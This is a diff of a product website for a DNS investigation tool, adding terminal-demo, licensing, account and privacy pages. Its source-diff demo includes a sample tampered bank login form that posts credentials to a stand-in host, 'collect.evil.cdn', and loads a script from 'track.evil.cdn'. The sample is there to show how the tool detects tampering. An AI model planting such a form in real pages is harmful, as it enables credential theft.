+              <button type="button" class="cmd" data-action="runCmd" data-arg="email" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#2dd4bf">email</button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="subdomains" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#2dd4bf">subdomains</button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="propagation" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#2dd4bf">propagation</button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="firewall" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#2dd4bf">firewall</button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="dnssec" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#2dd4bf">dnssec</button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="help" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#8f83b8">help</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- terminal -->
+        <div id="mterm-frame" style="border-radius:14px;overflow:hidden;background:#07040f;border:1px solid rgba(148,120,246,.2);box-shadow:0 30px 80px rgba(0,0,0,.5)">
+          <div id="mterm-bar" style="height:34px;display:flex;align-items:center;gap:9px;padding:0 14px;background:rgba(20,14,32,.9);border-bottom:1px solid rgba(148,120,246,.14)"><span id="mterm-dots" style="display:flex;gap:6px"><span style="width:10px;height:10px;border-radius:50%;background:#ff5f57"></span><span style="width:10px;height:10px;border-radius:50%;background:#febc2e"></span><span style="width:10px;height:10px;border-radius:50%;background:#28c840"></span></span><span id="mterm-title" style="flex:1;text-align:center;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#8f83b8">syxx@dimensions — members shell — restricted DNS command set</span></div>
+          <div id="mterm" style="padding:16px 18px;font-family:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px;line-height:1.6;color:#c9c1e6;height:300px;overflow-y:auto;white-space:pre-wrap"></div>
+        </div>
+        <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:12.5px;color:#6f6597;margin-top:10px">This is a governed shell: only the DNS commands above will run — pick one and it uses the domain and type you set. Portal, Glutton, and Cage read your local network and stay inside the desktop app.</div>
+      </section>
+
+      <!-- ============ ENTER (SIGN IN / ACTIVATE LICENSE) ============ -->
+      <section id="signin" class="page" style="padding:52px 48px 60px">
+        <div style="max-width:430px;margin:0 auto;text-align:center">
+          <span style="display:inline-grid;place-items:center;width:46px;height:46px;border-radius:12px;background:rgba(124,92,255,.14);color:#a78bff;font-size:22px">⟡</span>
+          <h2 style="font:600 28px 'Cinzel',serif;color:#efeafe;margin:16px 0 4px">Activate Syxx Pro</h2>
+          <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:14px;color:#9a8fc0;margin-bottom:26px">Enter the license key emailed to you after purchase. It activates Pro on this device.</div>
+          <div style="text-align:left;display:flex;flex-direction:column;gap:16px">
+            <div><label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">License Key</label><input id="si-key" type="text" placeholder="SYXX-PRO-XXXX-XXXX-XXXX" style="width:100%;padding:11px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font:400 14px ui-monospace,monospace;outline:none;letter-spacing:.04em"></div>
+            <button type="button" class="btn" data-action="doSignin" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;display:block;text-align:center;padding:13px;border-radius:12px;background:linear-gradient(120deg,#7c5cff,#5b3fd6);color:#fff;font:600 14px system-ui;box-shadow:0 12px 30px rgba(124,92,255,.4);cursor:pointer">Activate</button>
+          </div>
+          <div style="margin-top:18px;font-size:12.5px;color:#8f83b8">No license yet? <a href="#create" data-action="show" data-arg="create">Subscribe to Pro</a></div>
+          <div style="margin-top:8px;font-family:'EB Garamond',serif;font-style:italic;font-size:12px;color:#6f6597;line-height:1.5">Your key is validated server-side via Keygen and bound to your device. It is never sent with DNS data.</div>
+        </div>
+      </section>
+
+      <!-- ============ CREATE ACCOUNT ============ -->
+      <section id="create" class="page" style="padding:40px 48px 56px">
+        <div style="max-width:980px;margin:0 auto">
+          <div style="font:500 10px Jost,system-ui;letter-spacing:.22em;color:#8a6ef0;text-transform:uppercase">Membership</div>
+          <h2 style="font:600 28px 'Cinzel',serif;color:#efeafe;margin:8px 0 4px">Create Account</h2>
+          <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:14px;color:#9a8fc0;margin-bottom:26px">$3.95/month or $19.95/year. No permanent licenses — cancel anytime.</div>
+          <div style="display:grid;grid-template-columns:1.08fr .92fr;gap:26px;align-items:start">
+            <div style="display:flex;flex-direction:column;gap:18px">
+              <div><label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Email</label><input id="ca-email" type="email" placeholder="you@example.com" style="width:100%;padding:11px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font:400 14px system-ui;outline:none"></div>
+              <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">
+                <div><label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Passphrase</label><input type="password" placeholder="••••••••" style="width:100%;padding:11px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font:400 14px system-ui;outline:none"></div>
+                <div><label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Confirm</label><input type="password" placeholder="••••••••" style="width:100%;padding:11px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22);color:#efeafe;font:400 14px system-ui;outline:none"></div>
+              </div>
+              <div>
+                <label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Plan</label>
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+                  <button type="button" id="plan-monthly" data-action="selPlan" data-arg="monthly" aria-pressed="false" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;width:100%;text-align:left;border-radius:12px;padding:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);transition:all .14s"><span style="display:block;font:600 15px 'Cinzel',serif;color:#efeafe">Monthly</span><span style="display:block;font:600 22px 'Cinzel',serif;color:#efeafe;margin-top:3px">$3.95<span style="font-size:12px;color:#8f83b8;font-family:Jost,system-ui"> /mo</span></span></button>
+                  <button type="button" id="plan-yearly" data-action="selPlan" data-arg="yearly" aria-pressed="false" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;width:100%;text-align:left;border-radius:12px;padding:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);transition:all .14s"><span style="display:block;font:600 15px 'Cinzel',serif;color:#efeafe">Yearly <span style="font:700 8px system-ui;letter-spacing:.08em;color:#e0b45a;vertical-align:middle">SAVE 58%</span></span><span style="display:block;font:600 22px 'Cinzel',serif;color:#efeafe;margin-top:3px">$19.95<span style="font-size:12px;color:#8f83b8;font-family:Jost,system-ui"> /yr</span></span></button>
+                </div>
+              </div>
+              <div>
+                <label style="display:block;font:600 10.5px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">Payment</label>
+                <div style="border-radius:12px;border:1px solid rgba(148,120,246,.22);background:rgba(10,6,20,.5);padding:16px;display:flex;align-items:center;gap:12px">
+                  <span style="color:#2dd4bf;font-size:20px">🔒</span>
+                  <div style="font-size:12.5px;color:#9a8fc0;line-height:1.5">You'll be redirected to Stripe's secure checkout to enter your card details. Syxx servers never store or see card numbers.</div>
+                </div>
+              </div>
+              <button type="button" class="btn" data-action="doCreate" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;display:block;text-align:center;padding:13px;border-radius:12px;background:linear-gradient(120deg,#7c5cff,#5b3fd6);color:#fff;font:600 14px system-ui;box-shadow:0 12px 30px rgba(124,92,255,.4);cursor:pointer">Continue to checkout</button>
+              <div id="checkout-error" style="display:none;margin-top:12px;padding:14px 18px;border-radius:10px;background:rgba(255,77,109,.08);border:1px solid rgba(255,77,109,.3);font-size:13px;color:#f0b8c2;line-height:1.55">
+                <span style="font-weight:600;color:#ff4d6d">⚠ Checkout unavailable</span><br>
+                We're having trouble connecting to our payment processor. Please try again in a few minutes. If the issue persists, contact <a href="mailto:feedback@milkandgin.com" style="color:#a78bff;text-decoration:underline">feedback@milkandgin.com</a> and we'll get you set up.
+              </div>
+              <div style="text-align:center;font-size:12.5px;color:#8f83b8">Already have a license? <a href="#signin" data-action="show" data-arg="signin">Activate it</a></div>
+            </div>
+            <div style="border-radius:16px;border:1px solid rgba(45,212,191,.24);background:linear-gradient(165deg,rgba(45,212,191,.06),rgba(124,92,255,.05));padding:22px">
+              <div style="display:flex;align-items:center;gap:10px;margin-bottom:6px"><span style="display:inline-grid;place-items:center;width:34px;height:34px;border-radius:9px;background:rgba(45,212,191,.14);color:#2dd4bf;font-size:16px">🛡</span><h3 style="margin:0;font:600 16px 'Cinzel',serif;color:#efeafe">Sealed at the door</h3></div>
+              <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:13px;color:#9a8fc0;margin-bottom:16px;line-height:1.5">Your email is encrypted on your device before it ever reaches us. Watch what the server actually stores:</div>
+              <div style="border-radius:11px;background:#07040f;border:1px solid rgba(148,120,246,.2);padding:14px;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:11.5px;line-height:1.9;color:#c9c1e6">
+                <div style="color:#6f6597">// your row in our database</div>
+                <div>blind_index: <span id="store-blind" style="color:#a78bff">—</span></div>
+                <div>sealed_pii&nbsp;: <span id="store-sealed" style="color:#2dd4bf;word-break:break-all">—</span></div>
+                <div>operator_read: <span style="color:#ff9a3d">DENIED</span></div>
+              </div>
+              <div style="margin-top:14px;font-size:12.5px;color:#b3a7d6;line-height:1.55">The blind index lets us find your row without knowing your email. The sealed value opens only for a checkout, a license-key email, or your own login. <a href="#privacy" data-action="show" data-arg="privacy">How it works →</a></div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ MANAGE ACCOUNT ============ -->
+      <section id="manage" class="page" style="padding:40px 48px 56px">
+        <div style="max-width:920px;margin:0 auto">
+          <div style="display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:22px;flex-wrap:wrap">
+            <div>
+              <h2 style="margin:0;font:500 10px Jost,system-ui;letter-spacing:.22em;color:#8a6ef0;text-transform:uppercase">Your Dimension</h2>
+              <div style="font:600 26px 'Cinzel',serif;color:#efeafe;margin-top:6px;display:flex;align-items:center;gap:12px"><span id="man-email">•••••••</span><button type="button" class="btn" id="man-reveal" data-action="toggleReveal" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:4px 11px;border-radius:8px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.3);color:#c4b3ff;font:600 10.5px system-ui;letter-spacing:.06em;cursor:pointer">reveal</button></div>
+            </div>
+            <span id="man-plan" style="padding:7px 14px;border-radius:999px;background:rgba(224,180,90,.16);border:1px solid rgba(224,180,90,.4);color:#e0b45a;font:700 11px system-ui;letter-spacing:.08em">PRO</span>
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:18px">
+              <h3 style="margin:0;font:500 10px Jost,system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:10px">Subscription</h3>
+              <div style="font:600 20px 'Cinzel',serif;color:#efeafe" id="man-price">$19.95 / year</div>
+              <div style="font-size:12.5px;color:#9a8fc0;margin-top:4px">Renews <span id="man-next" style="color:#c9c1e6">—</span></div>
+              <a class="btn" href="#create" data-action="show" data-arg="create" style="display:inline-block;margin-top:14px;padding:9px 15px;border-radius:9px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 12px system-ui;cursor:pointer">Change plan</a>
+            </div>
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:18px">
+              <h3 style="margin:0;font:500 10px Jost,system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:10px">Payment method</h3>
+              <div style="font-family:'JetBrains Mono',ui-monospace,monospace;font-size:15px;color:#efeafe">Visa •••• 4242</div>
+              <div style="font-size:12.5px;color:#9a8fc0;margin-top:4px">Charged by our PCI processor — unsealed only at renewal.</div>
+              <button type="button" class="btn" data-action="toast" data-arg="Redirecting to the processor’s secure portal…" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;display:inline-block;margin-top:14px;padding:9px 15px;border-radius:9px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 12px system-ui;cursor:pointer">Update payment</button>
+            </div>
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:18px">
+              <h3 style="margin:0;font:500 10px Jost,system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:10px">License key</h3>
+              <div style="font-family:'JetBrains Mono',ui-monospace,monospace;font-size:14px;color:#efeafe" id="man-key">SYXX-PRO-••••-••••-••••</div>
+              <div style="font-size:12.5px;color:#9a8fc0;margin-top:4px">Bound to your device, never sent with DNS data.</div>
+              <button type="button" class="btn" data-action="toast" data-arg="Unsealing your email to deliver the key…" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;display:inline-block;margin-top:14px;padding:9px 15px;border-radius:9px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 12px system-ui;cursor:pointer">Email me the key</button>
+            </div>
+            <div style="border-radius:14px;background:linear-gradient(165deg,rgba(45,212,191,.06),rgba(124,92,255,.04));border:1px solid rgba(45,212,191,.22);padding:18px">
+              <h3 style="margin:0;font:500 10px Jost,system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:10px">Operator visibility</h3>
+              <div style="font:600 18px 'Cinzel',serif;color:#2dd4bf">None — sealed</div>
+              <div style="font-size:12.5px;color:#9a8fc0;margin-top:4px">We store a blind index and ciphertext only. <a href="#privacy" data-action="show" data-arg="privacy">How it works →</a></div>
+            </div>
+          </div>
+          <div style="display:flex;gap:12px;margin-top:20px">
+            <a class="btn" href="#members" data-action="show" data-arg="members" style="padding:10px 17px;border-radius:10px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 12.5px system-ui;cursor:pointer">Open terminal</a>
+            <button type="button" class="btn" data-action="toast" data-arg="Subscription set to cancel at period end" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:10px 17px;border-radius:10px;background:rgba(255,77,109,.1);border:1px solid rgba(255,77,109,.32);color:#f0b8c2;font:600 12.5px system-ui;cursor:pointer">Cancel subscription</button>
+            <button type="button" class="btn" data-action="signOut" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:10px 17px;border-radius:10px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#c9c1e6;font:600 12.5px system-ui;cursor:pointer">Sign out</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ PRIVACY ============ -->
+      <section id="privacy" class="page" style="padding:40px 48px 60px">
+        <div style="max-width:900px;margin:0 auto">
+          <div style="font:500 10px Jost,system-ui;letter-spacing:.22em;color:#8a6ef0;text-transform:uppercase">Trust</div>
+          <h2 style="font:600 28px 'Cinzel',serif;color:#efeafe;margin:8px 0 4px">Zero-Knowledge Privacy</h2>
+          <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:14px;color:#9a8fc0">Your identity is encrypted on your device. We store only what we cannot read.</div>
+          <blockquote style="margin:22px 0;padding:20px 24px;border-left:3px solid #7c5cff;background:rgba(124,92,255,.07);border-radius:0 12px 12px 0;font-family:'EB Garamond',serif;font-style:italic;font-size:17px;color:#efeafe;line-height:1.5">“I am personally unable to view any PII on this server, and neither is anyone else. Your email is sealed on your device before it reaches us, and is only ever opened by an isolated service — for a payment, a license key, or your own sign-in.”<div style="font-family:Jost,system-ui;font-style:normal;font-size:12px;color:#8f83b8;margin-top:10px">— J.J. Warne, MilkandGin</div></blockquote>
+          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin:24px 0">
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(124,92,255,.28);padding:18px">
+              <div style="font:700 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#a78bff;margin-bottom:8px">1 · Your device</div>
+              <h3 style="margin:0;font:600 15px 'Cinzel',serif;color:#efeafe;margin-bottom:8px">Holds the key</h3>
+              <div style="font-size:12.5px;color:#9a8fc0;line-height:1.55">A key is derived from your passphrase (Argon2id) and never leaves. Your email is encrypted here before upload; login decrypts it here.</div>
+            </div>
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:18px">
+              <div style="font:700 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:8px">2 · Syxx server</div>
+              <h3 style="margin:0;font:600 15px 'Cinzel',serif;color:#efeafe;margin-bottom:8px">Holds only ciphertext</h3>
+              <div style="font-size:12.5px;color:#9a8fc0;line-height:1.55">Stores a blind index (for lookup) and sealed PII. No key, no plaintext. The operator sees ciphertext and nothing else.</div>
+            </div>
+            <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(45,212,191,.24);padding:18px">
+              <div style="font:700 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#2dd4bf;margin-bottom:8px">3 · Third parties</div>
+              <h3 style="margin:0;font:600 15px 'Cinzel',serif;color:#efeafe;margin-bottom:8px">Unseal in isolation</h3>
+              <div style="font-size:12.5px;color:#9a8fc0;line-height:1.55">The PII is sealed to the payment processor and license mailer. It is decrypted only inside their isolated enclave — never by the app server.</div>
+            </div>
+          </div>
+          <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:20px 22px">
+            <h3 style="margin:0;font:500 10px Jost,system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:12px">What this guarantees</h3>
+            <div style="display:flex;flex-direction:column;gap:9px;font-size:13.5px;color:#c9c1e6;line-height:1.5">
+              <div style="display:flex;gap:10px"><span style="color:#2dd4bf">✓</span>A database dump reveals no emails — only blind indexes and ciphertext.</div>
+              <div style="display:flex;gap:10px"><span style="color:#2dd4bf">✓</span>The operator has no decryption key and cannot read your identity.</div>
+              <div style="display:flex;gap:10px"><span style="color:#2dd4bf">✓</span>Plaintext exists only transiently, inside an isolated service, at the moment a third party genuinely needs it.</div>
+              <div style="display:flex;gap:10px"><span style="color:#2dd4bf">✓</span>Your DNS reports and license key are never linked to your identity on the server.</div>
+            </div>
+          </div>
+          <div style="border-radius:14px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16);padding:20px 22px;margin-top:16px">
+            <h3 style="margin:0;font:500 10px Jost,system-ui;letter-spacing:.18em;text-transform:uppercase;color:#8f83b8;margin-bottom:12px">Telemetry &amp; Usage Data</h3>
+            <div style="display:flex;flex-direction:column;gap:10px;font-size:13.5px;color:#c9c1e6;line-height:1.55">
+              <p style="margin:0">Syxx collects two kinds of anonymous telemetry, both of which you can turn off in Settings → Privacy:</p>
+              <div style="display:flex;gap:10px"><span style="color:#2dd4bf">•</span><strong>Dimension ping</strong> (syxx.app) — Once per app launch: your OS name, OS version, and app version. No IP address, no device ID, no DNS data.</div>
+              <div style="display:flex;gap:10px"><span style="color:#2dd4bf">•</span><strong>Operational telemetry</strong> (bugsmasher.syxx.app) — OTel spans and Sentry crash reports. Spans contain probe labels, timing metrics, and DNS resolver classification. Domain names are never emitted. Resolver IPs are redacted to class tokens. Crash reports include stack traces but no personal data.</div>
+              <p style="margin:8px 0 0 0"><strong>Data retention:</strong> OTel traces are retained for 30 days. Sentry crash reports are retained for 90 days. Data is stored on Syxx-owned infrastructure and is never shared with third parties.</p>
+              <p style="margin:0"><strong>Legal basis:</strong> Legitimate interest (GDPR Art. 6(1)(f)). You can object at any time by turning telemetry off in Settings.</p>
+              <p style="margin:0"><strong>Your rights:</strong> Access, rectification, erasure, and portability. Contact us to exercise these rights. Because telemetry is anonymous, we may need additional information to locate your data.</p>
+              <p style="margin:0"><strong>Cookies &amp; storage:</strong> This site uses localStorage for session management. No third-party cookies or trackers. The session token is cleared when you sign out.</p>
+              <p style="margin:8px 0 0 0"><strong>Data controller:</strong> Joel J. Warne, d/b/a MilkandGin. Contact: <a href="mailto:privacy@syxx.app" style="color:#a78bff">privacy@syxx.app</a>.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+    </main>
+
+    <footer style="max-width:1320px;margin:24px auto 0;text-align:center;font-size:13px;color:#6f6597;line-height:1.7">
+      <p style="margin:0">Syxx · A DNS investigative and protection suite</p>
+      <p style="margin:0">© J.J. Warne d/b/a MilkandGin · All rights reserved</p>
+      <p style="margin:0"><a href="/docs/help">Help</a> · <a href="/docs/api">API Docs</a> · <a href="https://leaktest.syxx.app">DNS Leak Test</a> · <a href="mailto:feedback@milkandgin.com">feedback@milkandgin.com</a></p>
+    </footer>
+
+<script>
+  // Reveal one .page panel. Returns false and changes nothing for an unknown id,
+  // rather than throwing on the querySelector('.page.on') that used to follow an
+  // id that matched no panel. Focus moves to the revealed panel's heading so a
+  // keyboard or screen-reader user lands in the new content instead of staying
+  // parked in the nav.
+  function show(id){
+    const target = document.getElementById(id);
+    if(!target || !target.classList.contains('page')) return false;
+    document.querySelectorAll('.page').forEach(p=>p.classList.toggle('on', p===target));
+    const heading = target.querySelector('h1,h2,h3');
+    if(heading){
+      if(!heading.hasAttribute('tabindex')) heading.setAttribute('tabindex','-1');
+      try{ heading.focus({preventScroll:true}); }catch(e){ heading.focus(); }
+    }
+    window.scrollTo(0,0);
+    return true;
+  }
+
+  // ---- secured cover terminal (button-only, no keyboard) ----
+  const term = document.getElementById('term');
+  const PD = '<span style="color:#2dd4bf">syxx@dimensions</span><span style="color:#6f6597">:~$</span> ';
+  const PD_UNIX = PD, PD_PS = '<span style="color:#f4f4f4">PS</span> <span style="color:#4ec9b0">C:\\Users\\syxx</span><span style="color:#f4f4f4">&gt;</span> ', PD_UBU = '<span style="color:#8ae234;font-weight:600">syxx@dimensions</span><span style="color:#eeeeec">:</span><span style="color:#729fcf;font-weight:600">~</span><span style="color:#eeeeec">$</span> ';
+
+  function hasSession(){ try{return !!localStorage.getItem('syxx_session');}catch(e){return false;} }
+  function termDomain(){ return (document.getElementById('term-domain')||{}).value||''; }
+  function termAppend(html){ term.innerHTML += html + '\n'; term.scrollTop = term.scrollHeight; }
+
+  const PRO_COMMANDS = new Set(['mirror','warp']);
+  const DEMO_OUTPUTS = {
+    prophet: (d) => `<span style="color:#8f83b8">Querying 9 public resolvers from the syxx.app vantage…</span>\n  cloudflare 1.1.1.1 → resolving…\n  google     8.8.8.8 → resolving…\n  quad9      9.9.9.9 → resolving…\n<span style="color:#f7931e">⚡ Demo output — activate Pro for live results from the server.</span>`,
+    conclude: () => `<span style="color:#8f83b8">Weaving all remote-capable modules into one conclusion…</span>\n<span style="color:#f7931e">⚡ Demo output — activate Pro for a live combined conclusion.</span>`,
+    help: () => `<span style="color:#8f83b8">Governed command set (buttons only — no keyboard input accepted):</span>\n  prophet   resolver consensus from the server       <span style="color:#2dd4bf">free</span>\n  mirror    <span style="color:#e0b45a">[Pro]</span> remote vs origin asset comparison\n  warp      <span style="color:#e0b45a">[Pro]</span> remote/local source diff\n  conclude  combined conclusion                          <span style="color:#2dd4bf">free</span>\n<span style="color:#6f6597">Local-only (desktop app): portal · glutton · cage</span>`,
+  };
+
+  function run(k){
+    // Input validation
+    const d = termDomain().trim();
+    const needsDomain = ['prophet','mirror','warp'];
+    if(needsDomain.includes(k) && !d){
+      termAppend(PD + '<span style="color:#ff4d6d">! enter a domain in the field above first</span>');
+      return;
+    }
+    // Paywall gate for Pro commands
+    if(PRO_COMMANDS.has(k) && !hasSession()){
+      termAppend(PD + 'syxx ' + k + ' ' + d + ' <span style="color:#e0b45a">[Pro]</span>\n<span style="color:#ff4d6d">✗ Pro subscription required.</span> <a href="#create" data-action="show" data-arg="create" style="color:#a78bff">Subscribe →</a> or <a href="#signin" data-action="show" data-arg="signin" style="color:#a78bff">activate a license key →</a>');
+      return;
+    }
+    // Execute command
+    const fn = DEMO_OUTPUTS[k];
+    if(fn){
+      termAppend(PD + 'syxx ' + k + (d ? ' ' + d : '') + '\n' + fn(d));
+    } else {
+      termAppend(PD + 'syxx ' + k + '\n<span style="color:#f7931e">command not available in this shell</span>');
+    }
+  }
+
+  // Initial terminal message (no cursor — keyboard input disabled)
+  term.innerHTML = PD + '<span style="color:#8f83b8">Syxx Dimensions remote shell · button-only mode · set a domain, then pick a command below.</span>\n';
+
+  // ---- warp source panels with diff highlight ----
+  const h1='<span style="background:rgba(255,77,109,.35);border-radius:2px">', h2='<span style="background:rgba(45,212,191,.3);border-radius:2px">', e='</span>';
+  document.getElementById('remoteSrc').innerHTML =
+`&amp;lt;!doctype html&amp;gt;
+&amp;lt;html lang="en"&amp;gt;
+ &amp;lt;head&amp;gt;
+  &amp;lt;meta charset="utf-8"&amp;gt;
+  &amp;lt;title&amp;gt;Example Bank — Login&amp;lt;/title&amp;gt;
+  &amp;lt;link rel="stylesheet" href="/app.css"&amp;gt;
+ &amp;lt;/head&amp;gt;
+ &amp;lt;body&amp;gt;
+  &amp;lt;form ${h1}action="//collect.evil.cdn/x"${e}
+        method="post"&amp;gt;
+   &amp;lt;input name="user"&amp;gt;
+   &amp;lt;input name="pass" type="password"&amp;gt;
+   &amp;lt;button&amp;gt;Sign in&amp;lt;/button&amp;gt;
+  &amp;lt;/form&amp;gt;
+  &amp;lt;script src="/app.js"&amp;gt;&amp;lt;/script&amp;gt;
+  ${h1}&amp;lt;script src="//track.evil.cdn/k.js"&amp;gt;&amp;lt;/script&amp;gt;${e}
+ &amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;`;
+  document.getElementById('localSrc').innerHTML =
+`&amp;lt;!doctype html&amp;gt;
+&amp;lt;html lang="en"&amp;gt;
+ &amp;lt;head&amp;gt;
+  &amp;lt;meta charset="utf-8"&amp;gt;
+  &amp;lt;title&amp;gt;Example Bank — Login&amp;lt;/title&amp;gt;
+  &amp;lt;link rel="stylesheet" href="/app.css"&amp;gt;
+ &amp;lt;/head&amp;gt;
+ &amp;lt;body&amp;gt;
+  &amp;lt;form ${h2}action="/session/login"${e}
+        method="post"&amp;gt;
+   &amp;lt;input name="user"&amp;gt;
+   &amp;lt;input name="pass" type="password"&amp;gt;
+   &amp;lt;button&amp;gt;Sign in&amp;lt;/button&amp;gt;
+  &amp;lt;/form&amp;gt;
+  &amp;lt;script src="/app.js"&amp;gt;&amp;lt;/script&amp;gt;
+
+
+ &amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;`;
+
+  // ---- EULA ----
+  const P2=(t)=>`<p style="margin:0 0 12px">${t}</p>`;
+  const H=(n,t)=>`<p style="margin:0 0 6px"><b style="color:#efeafe">${n}</b> ${t}</p>`;
+  const B=(t)=>`<div style="margin:0 0 5px 16px;text-indent:-10px;padding-left:10px">• ${t}</div>`;
+  document.getElementById('eula').innerHTML =
+    P2('This is the license agreement between you and <b style="color:#efeafe">Joel J. “J.J.” Warne, doing business as MilkandGin</b> for the Syxx app and its documentation (the “Software”). When you download, install, or use the Software, you agree to these terms.')
+    + H('1. What you can do.','You get a personal license to install and use the Software. One person can use it on up to five devices they own or control, or several people can share it on one Mac.')
+    + H('2. What you can’t do.','Don’t sell, rent, lend, or share the Software over a network for several devices to use at once. Don’t modify, reverse engineer, or take the Software apart, except where the law says you may, and don’t remove any of its notices.')
